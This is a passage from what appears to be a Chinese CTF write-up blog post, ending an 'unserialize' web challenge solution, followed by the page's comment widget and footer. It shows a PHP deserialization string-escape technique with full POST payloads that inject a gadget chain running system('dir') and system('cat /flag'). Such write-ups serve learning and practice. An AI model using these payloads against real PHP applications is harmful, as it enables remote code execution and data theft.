+<p>前面提到name中有一个hnctf经过替换后就会多出一个长度。那么这里多长来了165就需要用165个hnctf，如：<br>hnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctf”;s:3:”key”;s:4:”hctf”;s:8:”basedata”;s:106:”O:1:”T”:3:{s:1:”a”;N;s:1:”b”;R:2;s:1:”t”;O:1:”C”:1:{s:1:”a”;O:1:”F”:1:{s:3:”cmd”;s:14:”system(“dir”);”;}}}”;s:2:”ob”;N;}</p>
+<p>最后序列化得到：</p>
+<p>O:1:”H”:4:{s:4:”name”;s:990:”hnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctf”;s:3:”key”;s:4:”hctf”;s:8:”basedata”;s:106:”O:1:”T”:3:{s:1:”a”;N;s:1:”b”;R:2;s:1:”t”;O:1:”C”:1:{s:1:”a”;O:1:”F”:1:{s:3:”cmd”;s:14:”system(“dir”);”;}}}”;s:2:”ob”;N;}”;s:3:”key”;N;s:8:”basedata”;N;s:2:”ob”;N;}</p>
+<p>替换后（hacker就刚好是990长，可以进行正常反序列化，对后面的属性进行覆盖，遇到  ;}  就终止）：<br>O:1:”H”:4:{s:4:”name”;s:990:”hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker”;s:3:”key”;s:4:”hctf”;s:8:”basedata”;s:106:”O:1:”T”:3:{s:1:”a”;N;s:1:”b”;R:2;s:1:”t”;O:1:”C”:1:{s:1:”a”;O:1:”F”:1:{s:3:”cmd”;s:14:”system(“dir”);”;}}}”;s:2:”ob”;N;}”;s:3:”key”;N;s:8:”basedata”;N;s:2:”ob”;N;}</p>
+<p>payload</p>
+<p>POST:</p>
+<p>data&#x3D;hnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctf”;s:3:”key”;s:4:”hctf”;s:8:”basedata”;s:106:”O:1:”T”:3:{s:1:”a”;N;s:1:”b”;R:2;s:1:”t”;O:1:”C”:1:{s:1:”a”;O:1:”F”:1:{s:3:”cmd”;s:14:”system(“dir”);”;}}}”;s:2:”ob”;N;}</p>
+<p><img src="/../image/web%E7%9A%84wp%E9%83%A8%E5%88%86/1746112110709-6b3c9065-0313-4c5c-be73-335cb07609f7.png" alt="img"></p>
+<p>因为我这是本地环境，用的是dir，最后改一下payload就行了：</p>
+<p>data&#x3D;hnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctfhnctf”;s:3:”key”;s:4:”hctf”;s:8:”basedata”;s:112:”O:1:”T”:3:{s:1:”a”;N;s:1:”b”;R:2;s:1:”t”;O:1:”C”:1:{s:1:”a”;O:1:”F”:1:{s:3:”cmd”;s:20:”system(“cat &#x2F;flag”);”;}}}”;s:2:”ob”;N;}</p>
+
+  </div>
+</article>
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: '0cD8XYS5aRoaPXBQ2dkwSoOI-gzGzoHsz',
+            appKey: 'UD7mUoaxqx0jyMaDNVNDgTpN',
+            placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+            avatar: 'robohash'
+        })
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#rce"><span class="toc-number">1.</span> <span class="toc-text">rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unset"><span class="toc-number">2.</span> <span class="toc-text">unset</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unserialize"><span class="toc-number">3.</span> <span class="toc-text">unserialize</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&text=web的wp部分"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&title=web的wp部分"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&is_video=false&description=web的wp部分"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web的wp部分&body=Check out this article: http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&title=web的wp部分"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&title=web的wp部分"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&title=web的wp部分"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&title=web的wp部分"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&name=web的wp部分&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&t=web的wp部分"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025
+    jujub3
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
